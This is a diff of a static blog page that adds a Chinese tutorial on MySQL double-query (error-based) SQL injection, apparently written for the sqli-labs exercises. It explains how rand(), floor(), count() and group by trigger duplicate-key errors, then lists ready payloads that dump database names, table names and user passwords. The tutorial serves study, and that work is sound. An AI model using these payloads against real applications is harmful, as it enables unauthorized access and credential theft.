@@ -375,14 +375,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    0
+                    615
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
 
@@ -410,7 +410,56 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h4 id="1、预备知识"><a href="#1、预备知识" class="headerlink" title="1、预备知识"></a>1、预备知识</h4><p>在学习双查询注入前我们需要学习SQL语句的子查询，何为子查询？<br><br></p>
+<p>查询的关键字是select，子查询可以简单的理解为在select语句里还有一个select，里面的这个select语句就是子查询。</p>
+<pre class="line-numbers language-none"><code class="language-none">select concat((select database()));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>执行这条语句的时候，会先从子查询先开始，因此执行select database()的时候，这个语句就会把当前数据库查出来，然后传入concat函数，concat是用来连接的，比如传入(‘a’,’b’,’c’)那传入concat的值就是abc</p>
+<p><img src="https://gitee.com/night7i/img/raw/master/img/20210609095755.png"></p>
+<p><img src="https://gitee.com/night7i/img/raw/master/img/20210609095709.png"></p>
+<p>双注入查询需要四个函数/语句</p>
+<ul>
+<li>1、Rand()        //随机函数 - 生成随机小数</li>
+</ul>
+<p><img src="https://gitee.com/night7i/img/raw/master/img/20210609105424.png"></p>
+<ul>
+<li>2、Floor()        //取整函数</li>
+</ul>
+<p>![](<a target="_blank" rel="noopener" href="https://gitee.com/night7i/img/raw/master/img/20210609105442.png">https://gitee.com/night7i/img/raw/master/img/20210609105442.png</a></p>
+<p><img src="https://gitee.com/night7i/img/raw/master/img/20210609105458.png"></p>
+<ul>
+<li>3、count()        //汇总函数</li>
+</ul>
+<p><img src="https://gitee.com/night7i/img/raw/master/img/20210609105616.png"></p>
+<ul>
+<li>4、group by    //分组语句</li>
+</ul>
+<p><img src="https://gitee.com/night7i/img/raw/master/img/20210609105821.png"></p>
+<p><code>select username as a from users group by a;</code>其中<code>as a</code>可以理解为命名，也就是给列重命名为a。</p>
+<h4 id="2、原理"><a href="#2、原理" class="headerlink" title="2、原理"></a>2、原理</h4><p>在执行group by name语句的时候，语句对引用的字段进行索引，生成了一个<strong>虚拟表</strong>表中有名称为group_key的主键</p>
+<p><img src="https://gitee.com/night7i/img/raw/master/img/20210609131706.png"></p>
+<p>我们使用count函数查看虚拟表是否存在主键，如果不存在则插入新纪录</p>
+<p><img src="https://gitee.com/night7i/img/raw/master/img/20210609131731.png"></p>
+<p>当我们的查询语句中包含了rand()函数时，group by在处理时，对rand()函数进行了多次处理，所以造成了双查询报错信息。</p>
+<pre class="line-numbers language-none"><code class="language-none">select count(*),concat((select database()),floor(rand()*2)) as a from users group by a;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/night7i/img/raw/master/img/20210609132013.png"></p>
+<p>可以看到执行语句会返回两种结果：</p>
+<ul>
+<li>1、在传入group by新建虚拟表时，select database()+随机数生成的0或1 也就是<code>security0&amp;security1</code>的查询结果与group by主键冲突，便产生报错。</li>
+<li>2、select的查询结果与group by生成虚拟表的主键不冲突，则不会报错，输出正常查询结果。</li>
+</ul>
+<h4 id="3、语句总结"><a href="#3、语句总结" class="headerlink" title="3、语句总结"></a>3、语句总结</h4><p>爆库：<code>select 1,count(*),concat((select group_concat(schema_name) from information_schema.schemata),floor(rand()*2)) as a from information_schema.TABLES group by a --+</code></p>
+<p>爆表：<code>select count(*),1, concat((select group_concat(table_name) from information_schema.tables where table_schema=&#39;库名&#39;),floor(rand()*2)) as a from information_schema.tables group by a</code></p>
+<p>爆字段：<code>select count(*),1, concat((select password from users LIMIT 0,1),floor(rand()*2)) as a from information_schema.tables group by a</code></p>
+<p>其中LIMIT x,1    x为显示的第x个用户</p>
+<p>参考连接：</p>
+<p>如果对文章某些内容存在疑问或者看不懂的可以参考以下链接</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/369433047">https://zhuanlan.zhihu.com/p/369433047</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/laoxiajiadeyun/p/10283251.html#_caption2">https://www.cnblogs.com/laoxiajiadeyun/p/10283251.html#_caption2</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42128270/article/details/113908014">https://blog.csdn.net/weixin_42128270/article/details/113908014</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.2cto.com/article/201303/192718.html">https://www.2cto.com/article/201303/192718.html</a></p>
+
                 
             </div>
             <hr/>
@@ -756,7 +805,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">1.8k</span>&nbsp;字
+                class="white-color">2.4k</span>&nbsp;字
             
             
             
